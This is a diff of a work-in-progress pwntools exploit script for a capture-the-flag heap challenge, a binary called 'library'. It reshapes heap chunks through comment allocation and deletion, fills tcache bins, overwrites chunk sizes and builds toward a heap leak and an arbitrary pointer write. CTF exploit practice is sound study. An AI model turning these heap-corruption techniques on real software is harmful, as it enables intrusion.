@@ -4,50 +4,55 @@ from pwn import *
 ARB_PTR_WRITE_CHK_ID = 0
 ARB_CHK_ID_B = 0
 EDITOR_CHK = 0
-SAFE_CHK = 0
 
-CHK_USR = p64(0x31) + p64(0) + p64(0x20) + b'\x30\x12'
-CHK_PWD = p64(0) + p64(0) + p64(0x21)# + p64(0x61) + b'\x61'
+CHK_USR = p64(0x6161) + p64(0x0) + p64(0)
+CHK_PWD = p64(0x21) #+ p64(0x60) + p64(0x61) + b'\x61'
 
 
 def register(p: process, username: str = "user", password: str = "12345"):
-    p.sendlineafter("Your choice: ", "1")
-    p.sendlineafter("Username: ", username)
-    p.sendlineafter("Password: ", password)
+    p.sendline("1")
+    p.sendline(username)
+    p.sendline(password)
+    p.recvuntil("choice:")
 
 def login(p: process, username: str = "user", password: str = "12345"):
-    p.sendlineafter("Your choice: ", "2")
-    p.sendlineafter("Username: ", username)
-    p.sendlineafter("Password: ", password)
+    p.sendline("2")
+    p.sendline(username)
+    p.sendline(password)
+    p.recvuntil("choice:")
 
 def borrow_book(p: process, book_idx: int = 0):
-    p.sendlineafter("Your choice: ", "1")
-    p.sendlineafter("Which book do you want? ", str(book_idx))
+    p.sendline("1")
+    p.sendline(str(book_idx))
+    p.recvuntil("choice:")
 
 def del_comment(p: process, id: int, book_idx: int = 0):
-    p.sendlineafter("Your choice: ", "3")
-    p.sendlineafter("Which book did you leave the comment on? ", str(book_idx))
-    p.sendlineafter("What is the comment id? ", str(id))
+    p.sendline("3")
+    p.sendline(str(book_idx))
+    p.sendline(str(id))
     print("deleted: ", id)
+    p.recvuntil("choice:")
 
 def return_book(p: process, add_comment: bool = False, comment_len: int = 50, comment: str = "comment", title: str = "title") -> int:
     id = 0
-    p.sendlineafter("Your choice: ", "2")
+    p.sendline("2")
     if add_comment:
-        p.sendlineafter("do you want to leave a comment? [Y/n] ", 'Y')
-        p.sendlineafter("size of the comment: ", str(comment_len))
-        p.sendlineafter("title: ", title)
-        p.sendlineafter("content: ", comment)
+        p.sendline('Y')
+        p.sendline(str(comment_len))
+        p.sendline(title)
+        p.sendline(comment)
         p.recvuntil("Comment ")
         id = int(p.recvuntil(" ").decode())
         print("id: ", id)
     else:
         p.sendline('n')
+    p.recvuntil("choice: ", timeout=0.1)
 
     return id
 
 def logout(p: process):
-    p.sendlineafter("Your choice: ", "4")
+    p.sendline("4")
+    p.recvuntil("choice: ")
 
 def overwrite_top_chunk_size(p: process, new_top_chunk: int):
     borrow_book(p)
@@ -96,11 +101,6 @@ def arb_ptr_write_init(p: process):
     global ARB_PTR_WRITE_CHK_ID
     global ARB_CHK_ID_B
     global EDITOR_CHK
-    global SAFE_CHK
-
-    fill_tcache(p, 0x50, 7)
-    fill_tcache(p, 0x10, 7)
-
     id0 = create_comment(p, 0x1024)
     id_pre1 = create_comment(p, 0x1024)
     id_pre2 = create_comment(p, 0x1024)
@@ -113,49 +113,35 @@ def arb_ptr_write_init(p: process):
     sid = create_comment(p, 0x1200, (p64(0x60) + p64(0x61)) * (0x1100//8//2))
     del_comment(p, id2)
     del_comment(p, id1)
-    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1251))
+    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1261))
     print("edit id:", edit_id)
     del_comment(p, edit_id)
 
-    
-    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1220, b"a" * (0x1200 - 32) + p64(0x1230) + p64(0x61))# + p64(0) + p64(0x31))# + p64(0x60))
     #p.interactive()
-    #print("EDITOR_CHK:", EDITOR_CHK)
-    #del_comment(p, EDITOR_CHK)
-    #CHK_1 = create_comment(p, 0x500)
-    #p.interactive()
+    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1250, b"a" * (0x1200 - 32) + p64(0x60) + p64(0x61) + p64(0x60))
     #id5 = create_comment(p, 0x1024)
-    #del_comment(p, EDITOR_CHK, 3)
+    del_comment(p, EDITOR_CHK, 3)
+    #del_comment(p, id5)
+    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1211))
+    del_comment(p, ARB_PTR_WRITE_CHK_ID)
     #p.interactive()
-    #EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1211))
-    #del_comment(p, ARB_PTR_WRITE_CHK_ID)
-    #print("ARB_PTR_WRITE_CHK_ID: ", ARB_PTR_WRITE_CHK_ID)
-    #del_comment(p, ARB_PTR_WRITE_CHK_ID)
-    #ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1200, "Y" * 5, 3)
+    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1200, "Y" * 5, 3)
     #p.interactive()
-    SAFE_CHK = create_comment(p, 0x10, book = 4)
-    #p.interactive()
-    #del_comment(p, SAFE_CHK)
+    #ARB_CHK_ID_B = create_comment(p, 0x10,'\x00', 1)
     #p.interactive()
     #print("ARB_CHK_ID_B:", ARB_CHK_ID_B)
     #p.interactive()
-    #fill_tcache(p, 0x50, 1)
-
-    del_comment(p, 0)
-
-    #p.interactive()
-    #del_comment(p, 0x31) #del edit
+    fill_tcache(p, 0x50, 8)
+    p.interactive()
+    del_comment(p, 0) #del edit
     #del_comment(p, ARB_PTR_WRITE_CHK_ID)
 
-    #p.interactive()
+    p.interactive()
     logout(p)
     register(p, CHK_USR, CHK_PWD)
-    login(p, CHK_USR, CHK_PWD)
-    #borrow_book(p, 2)
-    logout(p)
     register(p)
     login(p)
-
+    p.interactive()
 
 def arb_re_write_chk(p: process):
     global ARB_PTR_WRITE_CHK_ID
@@ -180,67 +166,55 @@ def arbitrary_pointer_write(p: process, addr: int, data: str):
     login(p, CHK_USR, CHK_PWD)
     return_book(p, True, len(data) + 0x30, data)
     
-def parse_heap_leak_line(line: str):
-    real_line = b'the full guide to insanity: heap exploitation" by rozav\n' + b'a' * 10 #padding
-    addr = 0
-    data = b''
-    ok = False
-    for rch, ch in zip(real_line, line[4:]):
-        if ch == ord('"'):
-            break
-        if ch != rch:
-            ok = True
-        if ok:
-            data += bytes([ch])
-
-    return int.from_bytes(data, 'little')
 
 def leak_heap(p: process):
     global ARB_PTR_WRITE_CHK_ID
-    global ARB_CHK_ID_B
-    global EDITOR_CHK
-    global SAFE_CHK
-
+    #id0 = create_comment(p, 0x1024)
+    #
+    #p.interactive()
+    #ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1240, b"b"*0x11f0 + p64(0x0) + p64(0x6161) + b"b" * 0x18 + p64(0x6161) + p64(0) * 3 + b'\x00' * 5)
     logout(p)
     login(p, CHK_USR, CHK_PWD)
-    borrow_book(p, 2)
+    borrow_book(p)
     logout(p)
     login(p)
+
+    arb_re_write_chk(p)
+    p.interactive()
+    #id1 = create_comment(p, 0x1024)
     #p.interactive()
-    del_comment(p, 0, 4)
-    SAFE_CHK = create_comment(p, 0x10, p64(0x90), 3)
+    #del_comment(p, id1)
+    #del_comment(p, ARB_PTR_WRITE_CHK_ID)
+    #print("ss:" , ARB_PTR_WRITE_CHK_ID)
+    #p.interactive()
+    #ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1240)
+    #, b"b"*0x11f0 + p64(0x0) + p64(0x6161) + b"b" * 0x18 + p64(0x6161))# + (b"b" * 0x18))# + p64(addr))
+    #del_comment(p, ARB_PTR_WRITE_CHK_ID)
+    #fill_tcache(p, 0x10, 8)
+    #del_comment(p, 0x6161, 1)
+    #ARB_CHK_ID_B = create_comment(p, 0x10,'\x00', 1)
+    p.interactive()
+    #ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1240, b"b"*0x11f0 + p64(0x0) + p64(0x6161) + b"b" * 0x18 + p64(0x6161))# + (b"b" * 0x18))# + p64(addr))
 
-    logout(p)
-    login(p, CHK_USR, p32(SAFE_CHK))
-    return_book(p, True, 0x50, "hey", "noam")
-    print("SAFE_CHK:", SAFE_CHK)
-    p.sendline("1")
-    p.recvuntil("choice")
-    for i in range(2):
-        p.recvline()
-    line = p.recvline()
-
-    leak = parse_heap_leak_line(line)
-    print("heap leak: ", hex(leak))
-    return leak
+    #return_book(p, True, len(data) + 0x30, data)
 
 def main():
     ### run ###
     p = process("./library")
-    #p = remote("pwnable.co.il", 9010)
-
-    ### setup ###
+    p.recvuntil("choice:")
     register(p, "user", "12345")
     register(p, "user1", "12345")
     login(p)
+    fill_tcache(p, 0x10, 7)
 
     ### init ###
     arb_ptr_write_init(p)
 
     ### leaks ###
-    heap_leak = leak_heap(p)
+    #create_heap_trap(p)
     
     ### payload start ###
+    leak_heap(p)
     p.interactive()
     arbitrary_pointer_write(p, 0x6020A0, "asdfwefwe")
     #logout(p)
